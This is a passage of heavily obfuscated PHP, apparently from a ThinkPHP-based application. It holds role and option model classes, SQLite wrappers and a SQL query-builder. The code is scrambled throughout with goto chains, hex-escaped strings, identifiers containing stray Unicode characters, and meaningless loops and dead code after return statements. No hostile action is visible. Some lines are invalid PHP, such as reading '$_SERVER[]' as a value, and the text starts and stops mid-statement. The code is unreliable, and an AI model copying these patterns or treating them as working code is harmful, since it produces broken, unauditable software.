($eм - 1); $fȩ = $Cݐ[706]; goto E; d: for ($Cݓ = 0; $Cݓ < $d * 10; $Cݓ++) { if (($d * $Cݓ + 1) % $a͘ == 0) { $aѫ = $f[250](($d * $Cݓ + 1) / $a͘); break; } } $F = $f[120]($f[354] . ($bȅ + $eм) . $f[355] . $a͘ . $f[355] . $aѫ . $f[356]); $A = $this->{$_SERVER[][256]}($f旐[0], $F); goto aƠ¾; fʝ: $B֫ = $f[250]($B֫); $e = $Cݐ[702]; $bȅ = 0; goto aׇ; c: } public function znct188c9c08() { goto A噆ò; C: $B = $dʄ[719]; if (strlen($B) < $dʄ[574]) { return; } goto Fܥ; e󝋵: if (!$E޶) { return; } for ($B䒥޷ = $Bɽ; $B䒥޷ > 1; $B䒥޷--) { $cܐ = !0; $aǹ = $dʄ[718]; if (!$aǹ) { return; } foreach ($a as $bܾ) { if ($B䒥޷ % $bܾ == 0) { $cܐ = !1; break; } } if ($cܐ) { $eͨȽ = $B䒥޷; break; } } return $eͨȽ; goto C; A噆ò: $dʄ =& $_SERVER[]; $A郊 =& $_SERVER[]; $Bɽ = $A郊[338]($A郊[358](2, 14), $A郊[358](2, 16) - 1); goto E; E: $BŪ = $dʄ[713]; while ($BŪ < $dʄ[574]) { if ($BŪ >= 0) { break; } $BŪ++; } $a = array(); goto e; e: $f = $dʄ[714]; while ($f < $dʄ[620]) { if ($f >= 0) { break; } $f++; } $A = 1; goto bǦ; bǦ: while ($A <= (int) $A郊[359]($Bɽ)) { $B䒥޷ = $A; $e݄ = $dʄ[715]; while (!0) { $B䒥޷++; $F򤟘׉ = $dʄ[716]; while ($F򤟘׉ < $dʄ[583]) { if ($F򤟘׉ >= 0) { break; } $F򤟘׉++; } if ($B䒥޷ <= 2) { $A = $B䒥޷; break; } else { if ($B䒥޷ < 2) { continue; } } $cܐ = !0; for ($B = 2; $B <= $A郊[359]($B䒥޷); $B++) { if ($B䒥޷ % $B == 0) { $cܐ = !1; } } if ($cܐ) { $A = $B䒥޷; break; } } $a[] = $A; } $eͨȽ = 2; $E޶ = $dʄ[717]; goto e󝋵; Fܥ: } public function bmhx3c0cd6b8($Cժ, $e䞣) { $B =& $_SERVER[]; $b驋㧷 =& $_SERVER[]; return $b驋㧷[13](array($b驋㧷[14], $b驋㧷[360]), $Cժ, $e䞣); $f׊ = $B[720]; if (strlen($f׊) < $B[577]) { die; } } public function ikgdec3c0e78($D, $E΂) { $eЦ׍ =& $_SERVER[]; $EՋҥ =& $_SERVER[]; return $EՋҥ[13](array($EՋҥ[361], $EՋҥ[362]), $D, $E΂); $bƋ = $eЦ׍[721]; if (strlen($bƋ) < $eЦ׍[583]) { return; } } public function gzen3805f42c($EŎ˭, $cВ) { $fħτ =& $_SERVER[]; $Fծ =& $_SERVER[]; return $Fծ[13](array($Fծ[361], $Fծ[363]), $EŎ˭, $cВ); $bǿ = $fħτ[722]; if (strlen($bǿ) < $fħτ[577]) { return; } } } goto Aϛ; cٟ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\x65\155\137\x6f\160\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\156\165", "\x72\157\x6c\x65", "\162\x6f\x6c\145\107\162\157\165\160", "\162\x65\147\x69\163\x74", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($dӸж) { return "\x53\171\163\164\145\155\117\x70\164\151\157\x6e\x5f{$dӸж}"; } protected function optionDefault($F = '') { $f =& $_SERVER[]; if ($F == $f[33]) { return $GLOBALS[$f[6]][$f[376]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x72\157\x6c\145\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x61\165\x74\150", "\154\141\142\x65\154", "\144\151\163\160\x6c\x61\x79", "\x73\x79\x73\x74\x65\x6d", "\144\145\x73\x63", "\x69\x67\156\157\162\145\x45\170\164", "\151\x67\156\x6f\x72\145\x46\151\154\x65\x53\x69\172\x65", "\141\x64\155\151\x6e\x69\163\x74\x72\141\164\157\x72", "\x73\157\x72\x74"); public function listData($aζ = false, $fثֵˏ = "\163\157\x72\164", $E = false) { $fش =& $_SERVER[]; $Fӆߜ = parent::listData($aζ, $fثֵˏ, $E); if (!$aζ) { foreach ($Fӆߜ as $B𤅄 => $F߼簳) { if ($F߼簳[$fش[1876]] == 1) { $Fӆߜ[$B𤅄][$fش[425]] = LNG($fش[2096]); } } } return $Fӆߜ; } public function update($cܬ, $b) { goto A; B涘: if (!$f󡌷 || $Dʇ && $Dʇ[$C[388]] != $f󡌷[$C[388]]) { return !1; } if ($Dʇ[$C[1876]] == 1) { $b = array($C[28] => $b[$C[28]], $C[1707] => $b[$C[1707]]); } $this->filterAuth($b[$C[400]]); goto C; A: $C =& $_SERVER[]; $f󡌷 = parent::listData($cܬ); $Dʇ = $this->findByName($b[$C[28]]); goto B涘; C: return parent::update($cܬ, $b); goto E֮; E֮: } public function remove($Aӹ) { $aݹ = parent::listData($Aӹ); if (!$aݹ || $aݹ[$_SERVER[][1168]]) { return !1; } return parent::remove($Aӹ); } public function add($d) { goto AȨ; B包: return parent::insert($d); goto Dӣº; E: $Bꛦ = array($aȔ[407] => $B, $aȔ[1692] => $aȔ[33], $aȔ[1688] => $aȔ[1696], $aȔ[2097] => 1, $aȔ[1691] => 0, $aȔ[2098] => 0, $aȔ[1690] => $this->getSort()); $d = array_merge($Bꛦ, $d); $this->filterAuth($d[$aȔ[400]]); goto B包; AȨ: $aȔ =& $_SERVER[]; $B = $d[$aȔ[28]]; if ($this->findByName($B)) { return !1; } goto E; Dӣº: } private function getSort() { $c͌Ǿ =& $_SERVER[]; $EȰϘ = parent::listData(); $e߇߅ = array_to_keyvalue($EȰϘ, $c͌Ǿ[33], $c͌Ǿ[1709]); return empty($e߇߅) ? 0 : max($e߇߅) + 1; } private function filterAuth(&$d؆ջ) { $f =& $_SERVER[]; $b۸ = array(); $fϨ◯ = array_filter(explode($f[47], $d؆ջ)); foreach ($fϨ◯ as $d؆ջ) { $B߇ = explode($f[94], $d؆ջ); if ($B߇[0] == $f[2099] && $B߇[1] != $f[1089]) { $B = $B߇[0] . $f[94] . $B߇[1] . $f[2100]; if (!in_array($B, $fϨ◯)) { $b۸[] = $B; } } $b۸[] = $d؆ջ; } $d؆ջ = implode($f[47], $b۸); } public function sort($c򶸆, $Dü) { return parent::update($c򶸆, $Dü); } } goto aƊ; a͈מ: class DbSqlite extends DbSqliteBase { public function query($Fõ) { $fɱ =& $_SERVER[]; if (!CacheLock::fileLock($fɱ[9])) { return !1; } $A = parent::query($Fõ); CacheLock::fileUnLock($fɱ[9]); return $A; } public function execute($c) { $BᏃ =& $_SERVER[]; if (!CacheLock::fileLock($BᏃ[9])) { return !1; } $bЈͦ = parent::execute($c); CacheLock::fileUnLock($BᏃ[9]); return $bЈͦ; } } class DbSqlite3 extends DbSqlite3Base { public function query($f̣) { $eٿᧅ =& $_SERVER[]; if (!CacheLock::fileLock($eٿᧅ[9])) { return !1; } $aم = parent::query($f̣); CacheLock::fileUnLock($eٿᧅ[9]); return $aم; } public function execute($d) { $C퐕 =& $_SERVER[]; if (!CacheLock::fileLock($C퐕[9])) { return !1; } $Bܑ = parent::execute($d); CacheLock::fileUnLock($C퐕[9]); return $Bܑ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\x71" => "\74\76", "\x67\164" => "\x3e", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\x3d", "\156\x6f\x74\154\x69\153\x65" => "\x4e\x4f\x54\x20\114\111\x4b\105", "\154\151\153\x65" => "\114\x49\x4b\x45", "\x69\x6e" => "\111\x4e", "\x6e\x6f\164\151\156" => "\x4e\117\x54\40\111\x4e", "\x6e\x6f\164\x20\x69\x6e" => "\116\117\x54\x20\111\x4e", "\x62\145\x74\x77\145\145\x6e" => "\102\105\x54\127\x45\x45\x4e", "\x6e\x6f\164\x62\x65\x74\167\145\145\x6e" => "\x4e\117\124\x20\102\105\124\x57\x45\x45\x4e", "\x6e\157\x74\x20\142\145\164\167\x65\145\x6e" => "\x4e\x4f\124\40\102\x45\124\127\105\105\x4e"); protected $selectSql = "\x53\x45\114\105\x43\x54\x25\x44\111\x53\124\x49\x4e\103\124\45\x20\x25\106\x49\x45\x4c\x44\45\x20\x46\122\117\115\x20\45\124\x41\102\x4c\105\45\45\x4a\117\x49\116\45\x25\x57\x48\105\122\105\x25\45\x47\x52\117\x55\120\45\45\110\101\126\111\x4e\x47\x25\x25\x4f\122\104\105\x52\x25\45\x4c\111\115\x49\124\45\40\x25\125\x4e\111\x4f\116\x25\45\x43\117\x4d\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $f煵 = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][919], $f煵); } public function factory($fݫش = '') { goto F݄֫; B񵏝: $this->dbType = ucwords(strtolower($fݫش[$aތ򺝇[920]])); $Dի = $aތ򺝇[922] . $this->dbType; if (class_exists($Dի)) { $d = new $Dի($fݫش); if ($aތ򺝇[761] != strtolower($fݫش[$aތ򺝇[920]])) { $d->dbType = strtoupper($this->dbType); } else { $d->dbType = $this->_getDsnType($fݫش[$aތ򺝇[875]]); } } else { think_exception(think_lang($aތ򺝇[923]) . $aތ򺝇[924] . $Dի); } goto A; F݄֫: $aތ򺝇 =& $_SERVER[]; $fݫش = $this->parseConfig($fݫش); if (empty($fݫش[$aތ򺝇[920]])) { think_exception(think_lang($aތ򺝇[921])); } goto B񵏝; A: return $d; goto cԐ; cԐ: } public function __call($Eߐ, $D) { if (method_exists($this, $Eߐ)) { return call_user_func_array(array($this, $Eߐ), $D); } } protected function _getDsnType($E) { $E龮׻ = explode($_SERVER[][4], $E); $A = strtoupper(trim($E龮׻[0])); return $A; } private function parseConfig($c = '') { $eֹ =& $_SERVER[]; if (!empty($c) && is_string($c)) { $c = $this->parseDSN($c); } elseif (is_array($c)) { $c = array_change_key_case($c); $c = array($eֹ[920] => $c[$eֹ[760]], $eֹ[848] => $c[$eֹ[925]], $eֹ[849] => $c[$eֹ[926]], $eֹ[846] => $c[$eֹ[927]], $eֹ[847] => $c[$eֹ[928]], $eֹ[17] => $c[$eֹ[929]], $eֹ[875] => $c[$eֹ[762]], $eֹ[13] => isset($c[$eֹ[930]]) ? $c[$eֹ[930]] : array()); } elseif (empty($c)) { if (think_config($eֹ[931]) && $eֹ[761] != strtolower(think_config($eֹ[932]))) { $c = $this->parseDSN(think_config($eֹ[931])); } else { $c = array($eֹ[920] => think_config($eֹ[932]), $eֹ[848] => think_config($eֹ[933]), $eֹ[849] => think_config($eֹ[934]), $eֹ[846] => think_config($eֹ[935]), $eֹ[847] => think_config($eֹ[936]), $eֹ[17] => think_config($eֹ[242]), $eֹ[875] => think_config($eֹ[931]), $eֹ[13] => think_config($eֹ[937])); } } return $c; } protected function initConnect($aٟ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($aٟ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Dڣ => $fն) { $this->_linkID = $fն; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($E = false) { $C͑ =& $_SERVER[]; static $d = array(); if (empty($d)) { foreach ($this->config as $E߻ => $b) { $d[$E߻] = explode($C͑[47], $b); } } if (think_config($C͑[938])) { if ($E) { $B޵˄ = floor(mt_rand(0, think_config($C͑[939]) - 1)); } else { if (is_numeric(think_config($C͑[940]))) { $B޵˄ = think_config($C͑[940]); } else { $B޵˄ = floor(mt_rand(think_config($C͑[939]), count($d[$C͑[846]]) - 1)); } } } else { $B޵˄ = floor(mt_rand(0, count($d[$C͑[846]]) - 1)); } $cݺ = array($C͑[848] => isset($d[$C͑[848]][$B޵˄]) ? $d[$C͑[848]][$B޵˄] : $d[$C͑[848]][0], $C͑[849] => isset($d[$C͑[849]][$B޵˄]) ? $d[$C͑[849]][$B޵˄] : $d[$C͑[849]][0], $C͑[846] => isset($d[$C͑[846]][$B޵˄]) ? $d[$C͑[846]][$B޵˄] : $d[$C͑[846]][0], $C͑[847] => isset($d[$C͑[847]][$B޵˄]) ? $d[$C͑[847]][$B޵˄] : $d[$C͑[847]][0], $C͑[17] => isset($d[$C͑[17]][$B޵˄]) ? $d[$C͑[17]][$B޵˄] : $d[$C͑[17]][0], $C͑[875] => isset($d[$C͑[875]][$B޵˄]) ? $d[$C͑[875]][$B޵˄] : $d[$C͑[875]][0], $C͑[13] => isset($d[$C͑[13]][$B޵˄]) ? $d[$C͑[13]][$B޵˄] : $d[$C͑[13]][0]); return $this->connect($cݺ, $B޵˄); } public function parseDSN($E) { $C =& $_SERVER[]; if (empty($E)) { return !1; } $d꫊ = parse_url($E); if ($d꫊[$C[174]]) { $Bҷǜ = array($C[920] => $d꫊[$C[174]], $C[848] => isset($d꫊[$C[557]]) ? $d꫊[$C[557]] : $C[33], $C[849] => isset($d꫊[$C[941]]) ? $d꫊[$C[941]] : $C[33], $C[846] => isset($d꫊[$C[175]]) ? $d꫊[$C[175]] : $C[33], $C[847] => isset($d꫊[$C[176]]) ? $d꫊[$C[176]] : $C[33], $C[17] => isset($d꫊[$C[75]]) ? substr($d꫊[$C[75]], 1) : $C[33]); } else { preg_match($C[942], trim($E), $a˷); $Bҷǜ = array($C[920] => $a˷[1], $C[848] => $a˷[2], $C[849] => $a˷[3], $C[846] => $a˷[4], $C[847] => $a˷[5], $C[17] => $a˷[6]); } $Bҷǜ[$C[875]] = $C[33]; return $Bҷǜ; } protected function debug() { $aߘ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $aߘ[943]; if (think_config($aߘ[944])) { think_status($aߘ[945]); think_trace($this->queryStr . $aߘ[946] . think_status($aߘ[20], $aߘ[945], 6) . $aߘ[947], $aߘ[33], $aߘ[948]); } } protected function parseLock($bː = false) { $c镏 =& $_SERVER[]; if (!$bː) { return $c镏[33]; } if ($c镏[877] == $this->dbType) { return $c镏[949]; } return $c镏[950]; } protected function parseSet($D) { $D =& $_SERVER[]; foreach ($D as $bоş䤄 => $d) { if (is_array($d) && $D[293] == $d[0]) { $B㹘[] = $this->parseKey($bоş䤄) . $D[951] . $d[1]; } elseif (is_scalar($d) || is_null($d)) { $B㹘[] = $this->parseKey($bоş䤄) . $D[951] . $this->parseValue($d); } } return $D[952] . implode($D[47], $B㹘); } protected function bindParam($A≻, $B) { $this->bind[$_SERVER[][4] . $A≻] = $B; } protected function parseBind($dЬ) { $dЬ = array_merge($this->bind, $dЬ); $this->bind = array(); return $dЬ; } function parseKey(&$bʛҿ, $Aִ = true) { if ($Aִ) { $bʛҿ = $this->parseKeyCheck($bʛҿ); } return $bʛҿ; } function parseKeyCheck($d˰) { $Cį =& $_SERVER[]; $d˰ = trim($d˰); if (!preg_match($Cį[953], $d˰)) { think_exception($Cį[954] . $d˰); } return $d˰; } protected function parseValue($Cʩ) { $f屳 =& $_SERVER[]; if (is_string($Cʩ)) { $Cʩ = $f屳[916] . $this->escapeString($Cʩ) . $f屳[916]; } elseif (isset($Cʩ[0]) && is_string($Cʩ[0]) && strtolower($Cʩ[0]) == $f屳[293]) { $Cʩ = $this->escapeString($Cʩ[1]); } elseif (is_array($Cʩ)) { $Cʩ = array_map(array($this, $f屳[917]), $Cʩ); } elseif (is_bool($Cʩ)) { $Cʩ = $Cʩ ? $f屳[86] : $f屳[491]; } elseif (is_null($Cʩ)) { $Cʩ = $f屳[102]; } return $Cʩ; } protected function parseField($dč䧶) { $E܍ =& $_SERVER[]; if (is_string($dč䧶) && strpos($dč䧶, $E܍[47])) { $dč䧶 = explode($E܍[47], $dč䧶); } if (is_array($dč䧶)) { $cź = array(); foreach ($dč䧶 as $E => $a׽) { if (!is_numeric($E)) { $cź[] = $this->parseKey($E, !1) . $E܍[955] . $this->parseKey($a׽); } else { $cź[] = $this->parseKey($a׽); } } $aƲ = implode($E܍[47], $cź); } elseif (is_string($dč䧶) && !empty($dč䧶)) { $aƲ = $dč䧶; } else { $aƲ = $E܍[182]; } return $aƲ; } protected function parseTable($E⬒) { $A¼ =& $_SERVER[]; if (is_array($E⬒)) { $E߼ݭ = array(); foreach ($E⬒ as $eے => $f֙) { if (!is_numeric($eے)) { $E߼ݭ[] = $this->parseKey($eے) . $A¼[50] . $this->parseKey($f֙); } else { $E߼ݭ[] = $this->parseKey($eے); } } $E⬒ = $E߼ݭ; } elseif (is_string($E⬒)) { if (strstr($E⬒, $A¼[50])) { return $E⬒; } $E⬒ = explode($A¼[47], $E⬒); array_walk($E⬒, array($this, $A¼[866])); } return $A¼[860] . trim(implode($A¼[956], $E⬒), $A¼[380]) . $A¼[860]; } protected function parseWhere($F») { $FИ =& $_SERVER[]; $aۗ = $FИ[33]; if (is_string($F»)) { $aۗ = $F»; } else { $BƄ쓃 = isset($F»[$FИ[957]]) ? strtoupper($F»[$FИ[957]]) : $FИ[33]; if (in_array($BƄ쓃, array($FИ[958], $FИ[959], $FИ[960]))) { $BƄ쓃 = $FИ[50] . $BƄ쓃 . $FИ[50]; unset($F»[$FИ[957]]); } else { $BƄ쓃 = $FИ[961]; } foreach ($F» as $cмҟ => $c) { $aۗ .= $FИ[273]; if (is_numeric($cмҟ)) { $cмҟ = $FИ[962]; } if (0 === strpos($cмҟ, $FИ[70])) { $aۗ .= $this->parseThinkWhere($cмҟ, $c); } else { if (!preg_match($FИ[963], trim($cмҟ))) { think_exception(think_lang($FИ[964]) . $FИ[4] . $cмҟ); } $C = is_array($c) && isset($c[$FИ[965]]); $cмҟ = trim($cмҟ); if (strpos($cмҟ, $FИ[279])) { $d޴ = explode($FИ[279], $cмҟ); $e׍۾ = array(); foreach ($d޴ as $aՏԵ => $Eю) { $Fۤ = $C ? $c[$aՏԵ] : $c; $e׍۾[] = $FИ[256] . $this->parseWhereItem($this->parseKey($Eю), $Fۤ) . $FИ[865]; } $aۗ .= implode($FИ[966], $e׍۾); } elseif (strpos($cмҟ, $FИ[280])) { $d޴ = explode($FИ[280], $cмҟ); $e׍۾ = array(); foreach ($d޴ as $aՏԵ => $Eю) { $Fۤ = $C ? $c[$aՏԵ] : $c; $e׍۾[] = $FИ[256] . $this->parseWhereItem($this->parseKey($Eю), $Fۤ) . $FИ[865]; } $aۗ .= implode($FИ[961], $e׍۾); } else { $aۗ .= $this->parseWhereItem($this->parseKey($cмҟ), $c); } } $aۗ .= $FИ[274] . $BƄ쓃; } $aۗ = substr($aۗ, 0, -strlen($BƄ쓃)); } return empty($aۗ) ? $FИ[33] : $FИ[967] . $aۗ; } protected function parseWhereItem($e┙, $C񐒞) { $FȽ =& $_SERVER[]; $BƗș = $FȽ[33]; if (is_array($C񐒞)) { if (is_string($C񐒞[0])) { $F؞ = strtolower($C񐒞[0]); if (in_array($C񐒞[0], array($FȽ[951], $FȽ[968], $FȽ[969], $FȽ[970], $FȽ[971], $FȽ[972]))) { $BƗș .= $e┙ . $FȽ[50] . $C񐒞[0] . $FȽ[50] . $this->parseValue($C񐒞[1]); } elseif (preg_match($FȽ[973], $C񐒞[0])) { $BƗș .= $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[50] . $this->parseValue($C񐒞[1]); } elseif (preg_match($FȽ[974], $C񐒞[0])) { if (is_array($C񐒞[1])) { $E = isset($C񐒞[2]) ? strtoupper($C񐒞[2]) : $FȽ[959]; if (in_array($E, array($FȽ[958], $FȽ[959], $FȽ[960]))) { $Bޥ͛ = array(); foreach ($C񐒞[1] as $eƞ) { $Bޥ͛[] = $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[50] . $this->parseValue($eƞ); } $BƗș .= $FȽ[256] . implode($FȽ[50] . $E . $FȽ[50], $Bޥ͛) . $FȽ[865]; } } else { $BƗș .= $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[50] . $this->parseValue($C񐒞[1]); } } elseif ($FȽ[293] == $F؞) { $BƗș .= $FȽ[863] . $e┙ . $FȽ[50] . $C񐒞[1] . $FȽ[975]; } elseif (preg_match($FȽ[976], $C񐒞[0])) { $BƗș .= $C񐒞[0]; } elseif (preg_match($FȽ[977], $C񐒞[0])) { if (isset($C񐒞[2]) && $FȽ[293] == $C񐒞[2]) { $BƗș .= $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[50] . $C񐒞[1]; } else { if (is_string($C񐒞[1])) { $C񐒞[1] = explode($FȽ[47], $C񐒞[1]); } $aƘ = implode($FȽ[47], $this->parseValue($C񐒞[1])); $BƗș .= $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[863] . $aƘ . $FȽ[865]; } } elseif (preg_match($FȽ[978], $C񐒞[0])) { $fе = is_string($C񐒞[1]) ? explode($FȽ[47], $C񐒞[1]) : $C񐒞[1]; $BƗș .= $FȽ[863] . $e┙ . $FȽ[50] . $this->exp[$F؞] . $FȽ[50] . $this->parseValue($fе[0]) . $FȽ[961] . $this->parseValue($fе[1]) . $FȽ[274]; } else { think_exception(think_lang($FȽ[964]) . $FȽ[4] . $C񐒞[0]); } } else { $C = count($C񐒞); $aঢ় = $FȽ[33]; if (is_string($C񐒞[$C - 1])) { $aঢ় = isset($C񐒞[$C - 1]) ? strtoupper($C񐒞[$C - 1]) : $FȽ[33]; if (in_array($aঢ়, array($FȽ[958], $FȽ[959], $FȽ[960]))) { $C = $C - 1; } } else { $aঢ় = $FȽ[958]; } for ($A = 0; $A < $C; $A++) { $fе = is_array($C񐒞[$A]) ? $C񐒞[$A][1] : $C񐒞[$A]; if ($FȽ[293] == strtolower($C񐒞[$A][0])) { $BƗș .= $FȽ[256] . $e┙ . $FȽ[50] . $fе . $FȽ[975] . $aঢ় . $FȽ[50]; } else { $aץ = is_array($C񐒞[$A]) ? $this->exp[strtolower($C񐒞[$A][0])] : $FȽ[951]; if (!$aץ && is_array($C񐒞[$A]) && in_array($C񐒞[$A][0], array($FȽ[951], $FȽ[968], $FȽ[969], $FȽ[970], $FȽ[971], $FȽ[972]))) { $aץ = $C񐒞[$A][0]; } $BƗș .= $FȽ[256] . $e┙ . $FȽ[50] . $aץ . $FȽ[50] . $this->parseValue($fе) . $FȽ[975] . $aঢ় . $FȽ[50]; } } $BƗș = substr($BƗș, 0, -4); } } else { $BƗș .= $e┙ . $FȽ[979] . $this->parseValue($C񐒞); } return $BƗș; } protected function parseThinkWhere($d⑦, $d) { $C =& $_SERVER[]; $a׎ = $C[33]; switch ($d⑦) { case $C[348]: $a׎ = $d; break; case $C[962]: $a׎ = is_string($d) ? $d : substr($this->parseWhere($d), 6); break; case $C[980]: parse_str($d, $bω); if (isset($bω[$C[957]])) { $EČ = $C[50] . strtoupper($bω[$C[957]]) . $C[50]; unset($bω[$C[957]]); } else { $EČ = $C[961]; } $fںӕ = array(); foreach ($bω as $D摪Ϟ => $aǲ) { $fںӕ[] = $this->parseKey($D摪Ϟ) . $C[979] . $this->parseValue($aǲ); } $a׎ = implode($EČ, $fںӕ); break; } return $a׎; } protected function parseLimit($D) { $F良 =& $_SERVER[]; return !empty($D) ? $F良[48] . $D . $F良[50] : $F良[33]; } protected function parseJoin($bŌ) { $Cù =& $_SERVER[]; $a迬ֿ = $Cù[33]; if (!empty($bŌ)) { if (is_array($bŌ)) { foreach ($bŌ as $Aҭ => $E⿏) { if (!1 !== stripos($E⿏, $Cù[981])) { $a迬ֿ .= $Cù[50] . $E⿏; } else { $a迬ֿ .= $Cù[982] . $E⿏; } } } else { $a迬ֿ .= $Cù[982] . $bŌ; } } $a迬ֿ = preg_replace($Cù[983], think_config($Cù[889]) . $Cù[984], $a迬ֿ); return $a迬ֿ; } protected function parseOrder($Fʼ) { $C =& $_SERVER[]; if (is_array($Fʼ)) { $f򎚄 = array(); foreach ($Fʼ as $EȮ䚕 => $c֩) { if (is_numeric($EȮ䚕)) { $f򎚄[] = $this->parseKey($c֩); } else { $c֩ = in_array(strtoupper(trim($c֩)), array($C[985], $C[986])) ? $C[50] . $c֩ : $C[33]; if (preg_match($C[987], $EȮ䚕)) { $f򎚄[] = $this->parseKey($EȮ䚕) . $c֩; } else { think_exception($C[988] . $EȮ䚕); } } } $Fʼ = implode($C[47], $f򎚄); } return !empty($Fʼ) ? $C[989] . $Fʼ : $C[33]; } protected function parseGroup($Aٿر) { $Aܔ߿ =& $_SERVER[]; return !empty($Aٿر) ? $Aܔ߿[990] . $Aٿر : $Aܔ߿[33]; } protected function parseHaving($AЭ) { $c밡 =& $_SERVER[]; return !empty($AЭ) ? $c밡[991] . $AЭ : $c밡[33]; } protected function parseComment($F¡) { $D =& $_SERVER[]; return !empty($F¡) ? $D[992] . $F¡ . $D[993] : $D[33]; } protected function parseDistinct($EѦ) { $aح =& $_SERVER[]; return !empty($EѦ) ? $aح[994] : $aح[33]; } protected function parseUnion($aЍƃ) { $d筟 =& $_SERVER[]; if (empty($aЍƃ)) { return $d筟[33]; } if (isset($aЍƃ[$d筟[344]])) { $d = $d筟[995]; unset($aЍƃ[$d筟[344]]); } else { $d = $d筟[996]; } foreach ($aЍƃ as $EǴ) { $D޺[] = $d . (is_array($EǴ) ? $this->buildSelectSql($EǴ) : $EǴ); } return implode($d筟[50], $D޺); } public function insert($D˄, $fԒ = array(), $a֑ = false) { goto c凕; f䢄: $a݈ѡԃ .= $this->parseComment(!empty($fԒ[$f[350]]) ? $fԒ[$f[350]] : $f[33]); return $this->execute($a݈ѡԃ, $this->parseBind(!empty($fԒ[$f[281]]) ? $fԒ[$f[281]] : array())); goto EǸ; c凕: $f =& $_SERVER[]; $Aω = $dŰ = array(); $this->model = $fԒ[$f[277]]; goto b򡝩߫; b򡝩߫: foreach ($D˄ as $bדԅ => $aɧ) { if (is_array($aɧ) && $f[293] == $aɧ[0]) { $dŰ[] = $this->parseKey($bדԅ); $Aω[] = $aɧ[1]; } elseif (is_scalar($aɧ) || is_null($aɧ)) { $dŰ[] = $this->parseKey($bדԅ); $Aω[] = $this->parseValue($aɧ); } } $a݈ѡԃ = ($a֑ ? $f[867] : $f[868]) . $f[869] . $this->parseTable($fԒ[$f[275]]) . $f[863] . implode($f[47], $dŰ) . $f[864] . implode($f[47], $Aω) . $f[865]; $a݈ѡԃ .= $this->parseLock(isset($fԒ[$f[820]]) ? $fԒ[$f[820]] : !1); goto f䢄; EǸ: } public function selectInsert($a, $F㳎, $D㈗ = array()) { goto f؎; aʉ݋: array_walk($a, array($this, $f[866])); $A߆Я = $f[997] . $this->parseTable($F㳎) . $f[863] . implode($f[47], $a) . $f[975]; $A߆Я .= $this->buildSelectSql($D㈗); goto cٌ; f؎: $f =& $_SERVER[]; $this->model = $D㈗[$f[277]]; if (is_string($a)) { $a = explode($f[47], $a); } goto aʉ݋; cٌ: return $this->execute($A߆Я, $this->parseBind(!empty($D㈗[$f[281]]) ? $D㈗[$f[281]] : array())); goto fȑ; fȑ: } public function update($eЄԦ, $f܌) { $b֐ᛇ =& $_SERVER[]; $this->model = $f܌[$b֐ᛇ[277]]; $fߗ = $b֐ᛇ[998] . $this->parseTable($f܌[$b֐ᛇ[275]]) . $this->parseSet($eЄԦ) . $this->parseWhere(!empty($f܌[$b֐ᛇ[271]]) ? $f܌[$b֐ᛇ[271]] : $b֐ᛇ[33]) . $this->parseOrder(!empty($f܌[$b֐ᛇ[361]]) ? $f܌[$b֐ᛇ[361]] : $b֐ᛇ[33]) . $this->parseLimit(!empty($f܌[$b֐ᛇ[288]]) ? $f܌[$b֐ᛇ[288]] : $b֐ᛇ[33]) . $this->parseLock(isset($f܌[$b֐ᛇ[820]]) ? $f܌[$b֐ᛇ[820]] : !1) . $this->parseComment(!empty($f܌[$b֐ᛇ[350]]) ? $f܌[$b֐ᛇ[350]] : $b֐ᛇ[33]); return $this->execute($fߗ, $this->parseBind(!empty($f܌[$b֐ᛇ[281]]) ? $f܌[$b֐ᛇ[281]] : array())); } public function delete($dȥ = array()) { $a =& $_SERVER[]; $this->model = $dȥ[$a[277]]; $AƧ = $a[999] . $this->parseTable($dȥ[$a[275]]) . $this->parseWhere(!empty($dȥ[$a[271]]) ? $dȥ[$a[271]] : $a[33]) . $this->parseOrder(!empty($dȥ[$a[361]]) ? $dȥ[$a[361]] : $a[33]) . $this->parseLimit(!empty($dȥ[$a[288]]) ? $dȥ[$a[288]] : $a[33]) . $this->parseLock(isset($dȥ[$a[820]]) ? $dȥ[$a[820]] : !1) . $this->parseComment(!empty($dȥ[$a[350]]) ? $dȥ[$a[350]] : $a[33]); return $this->execute($AƧ, $this->parseBind(!empty($dȥ[$a[281]]) ? $dȥ[$a[281]] : array())); } public function select($a޵ = array()) { goto e; cܿۏ: if ($Aǋ && !1 !== $d⚛) { think_cache($f, $d⚛, $Aǋ); } return $d⚛; goto fӇ͸; e: $cǼ =& $_SERVER[]; $this->model = $a޵[$cǼ[277]]; $Bܴ = $this->buildSelectSql($a޵); goto EÑȌ; EÑȌ: $Aǋ = isset($a޵[$cǼ[345]]) ? $a޵[$cǼ[345]] : !1; if ($Aǋ) { $f = is_string($Aǋ[$cǼ[92]]) ? $Aǋ[$cǼ[92]] : $cǼ[1000] . md5($Bܴ); $F񯡠 = 